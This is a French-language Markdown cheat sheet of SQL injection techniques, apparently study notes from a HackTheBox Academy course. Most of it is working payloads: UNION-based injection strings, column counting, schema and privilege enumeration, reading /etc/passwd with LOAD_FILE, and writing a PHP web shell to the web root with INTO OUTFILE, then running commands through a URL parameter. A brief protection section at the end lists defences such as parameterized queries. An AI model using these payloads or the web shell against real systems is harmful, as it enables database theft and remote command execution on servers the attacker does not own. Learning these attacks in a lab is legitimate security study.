# SQL INJECTION

----
![Types d'injection sql](../Ressources/IMG/types_of_sqli.jpg)
* L'injection sql commence toujours avec : **'**
dans le but d'escape 
* **Le select dépend toujours du nombre de colonne**

|Payload | URL Encoded | commentaire|
|--|--|-- |
|'|%27| 
|"|%22|
|#|%23|
|;|%3B|
|)|%29|
|-- |--+| commentaire ("--" + espace )|
|#|%23| commentaire |

|Operations | Response |
|--|--|
|OR 1=1| true|
|@@version|Version utilisé ( pas une injection mais une var qui donne un string ) |
|database()| database name|


###### information à propos des utilisateurs et des privilèges
```sql
# username 
select user() |  current_user
       user from mysql.user
# privilege 
SELECT super_priv FROM mysql.user
# si on a plusieurs utilisateurs , on ajoute le where
cn' UNION SELECT super_priv FROM mysql.user WHERE user="<UserName>"-- -

# dump other privileges 
# ajouter where quand il y'a plusieurs users
cn' UNION SELECT grantee, privilege_type FROM information_schema.user_privileges-- -

```
---

###  UNION INJECTIONS :

> en fonction du nombre de colonne manquant, on rajoute de faux inputs

```sql
# employee à 6 colonnes et departments 2
# selectionner toutes les colonnes dans employee avec *

# selectionner les deux colonnes de departments 
# avec leur nom puis rajouter des trus random comme colonnes suivante 

SELECT * FROM employees UNION SELECT dept_no,dept_name,3,5,4,6 FROM departments AS result;

```
#### Trouver le nombre de colonne d'une table

##### Utilisation de UNION ou ORDER BY 
```sql

# ajouter l'extra - après les 2 précédants pour montrer qu'il y'a un espace après --

#ORDER BY
# s'arreter quand il y'a une erreur , pour un nombre n => le nombre de colonne = n-1
' order by <nombre>-- -

# UNION
# s'arrete quand il n'y a pas d'erreur => pour un nombre n => le nombre de colonne = n
cn' UNION select <fakeName1>,<Fakename2>,..,<FakeNameN>-- -

```

----
### Collecte d'information :  Énumération de base de données

* List des bases de données
* List des tables dans la base de données
* List des colonnes dans chaque table
> Pour avoir ces informations , on doit afficher INFORMATION_SCHEMA

#### List des bases de données
###### **SCHEMA_NAME** column contains all the database names currently present

```sql
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```
#### List des tables dans la base de données
* utilisation de **TABLE_NAME** et **TABLE_SCHEMA** dans **INFORMATION_SCHEMA.TABLES**
```sql
cn' UNION select TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES where table_schema='<dbName>'-- -
```

#### List des colonne d'une table dans la base de données
* utilisation de **COLUMN_NAME** **TABLE_NAME** **TABLE_SCHEMA** dans **INFORMATION_SCHEMA.COLUMNS**
```sql
cn' UNION select COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='<NameOfTable>'-- -
```

----
### Lecture de fichiers
* L'utilisateur de la base de données doit avoir le privilège FILE

```sql
# load_file accpeté par mysql and mariadb
SELECT LOAD_FILE('</etc/passwd | Path>');
```

----
### Écriture de fichiers

###### requirements : 
* FILE privilege
* secure_file_priv disabled
    ```bash
    SHOW VARIABLES LIKE 'secure_file_priv';

    SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"

    cn' UNION SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
    ```

* Write access to the location we want to write to on the back-end server
* write file 
```sql
# mettre le select dans un fichier 
SELECT <Element> from <tableName> INTO OUTFILE '<OutPutPath>'; # ex: SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';

```

> Note: To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use load_file 

```sql
# exemple
cn' union select '<?php system($_REQUEST[0]); ?>' into outfile '/var/www/html/shell.php'-- -
```

pour avoir accès au shell, on utilise
```bash
<URLFilePath>?0=<cmd>
```

----
### Protection
##### Anti escape de :  ' "

##### utiliser en php : 
* Pour Postgre : **pg_escape_string()**
* Pour Mysql : **mysqli_real_escape_string()**

##### Validation des input
* utiliser : !preg_match()

##### limit privileges to select

##### install web firewall

##### using parameterized queries
----

## Ressources

###### [_SQL Basics_](../HackTheBox/Academy/SQL%20basics.md)
###### [_Payload all the things_](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)